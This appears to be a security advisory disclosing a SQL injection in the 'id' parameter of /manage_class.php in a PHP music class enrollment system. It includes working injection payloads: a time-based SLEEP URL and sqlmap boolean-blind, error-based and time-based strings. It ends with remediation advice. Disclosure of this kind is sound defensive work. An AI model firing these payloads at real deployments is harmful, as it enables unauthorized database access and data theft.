# A SQL injection vulnerability exists in Music Course Registration system project V1.0 /manage_class.php

## Vulnerability author:
wanglun

## NAME OF AFFECTED PRODUCT
PHP music course registration system project

## Vendor Homepage
https://www.sourcecodester.com/php/15362/music-class-enrollment-site-phpoop-free-source-code.html

## VERSION: 
1.0
## Software Link
https://www.sourcecodester.com/download-code?nid=15362&title=Music+Class+Enrollment+System+in+PHP%2FOOP+Free+Source+Code

## Vulnerable File
/manage_class.php

# PROBLEM TYPE
## Vulnerability Type
SQL injection

## Root Cause
An SQL injection vulnerability was found in the /manage_class.php file of the Music Course Registration System project. The cause of the problem is that the attacker injects malicious code from the parameter "id" and uses it directly in the SQL query without proper cleaning or validation. This allows attackers to forge input values, thereby manipulating SQL queries and performing unauthorized actions.

## Impact
Attackers can exploit this SQL injection vulnerability to achieve unauthorized database access, sensitive data leakage, data tampering, comprehensive system control, and even service interruption, posing a serious threat to system security and business continuity.

## DESCRIPTION
During the security review of the Music Course Registration System, I discovered a serious SQL injection vulnerability in the file "/manage_class.php". This vulnerability stems from inadequate validation of user input for the 'id' parameter, allowing an attacker to inject malicious SQL queries. As a result, attackers can gain unauthorized access to databases, modify or delete data, and access sensitive information. Immediate remedial action is needed to ensure system security and protect data integrity.

# Vulnerability details and POC
## Vulnerability lonameion:
'id' parameter

## Payload:
http://localhost:80/mces/admin/?page=classes/manage_class&id=4' AND (SELECT 4594 FROM (SELECT(SLEEP(5)))ausq) AND 'oWIJ'='oWIJ

---
Parameter: id (GET)

    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: page=classes/manage_class&id=4' AND 4411=4411 AND 'coQB'='coQB

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: page=classes/manage_class&id=4' AND (SELECT 1734 FROM(SELECT COUNT(*),CONCAT(0x7178626a71,(SELECT (ELT(1734=1734,1))),0x7170787171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'ajTx'='ajTx

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: page=classes/manage_class&id=4' AND (SELECT 8993 FROM (SELECT(SLEEP(5)))FvcJ) AND 'eYKe'='eYKe
---

## The following are screenshots of some specific information obtained from testing and running with the sqlmap tool:

Payload: 
http://localhost:80/mces/admin/?page=classes/manage_class&id=4' AND (SELECT 4594 FROM (SELECT(SLEEP(5)))ausq) AND 'oWIJ'='oWIJ

![image](https://github.com/user-attachments/assets/99f448cc-ba5f-4f51-bc99-2b41d5389e81)

![image](https://github.com/user-attachments/assets/a009953f-0066-4d84-9e94-312c29169713)

# Suggested repair
1.Use prepared statements and parameter binding:
Preparing statements can prevent SQL injection as they separate SQL code from user input data. When using prepare statements, the value entered by the user is treated as pure data and will not be interpreted as SQL code.

2.Input validation and filtering:
Strictly validate and filter user input data to ensure it conforms to the expected format.

3.Minimize database user permissions:
Ensure that the account used to connect to the database has the minimum necessary permissions. Avoid using accounts with advanced permissions (such as' root 'or' admin ') for daily operations.

4.Regular security audits:
Regularly conduct code and system security audits to promptly identify and fix potential security vulnerabilities.
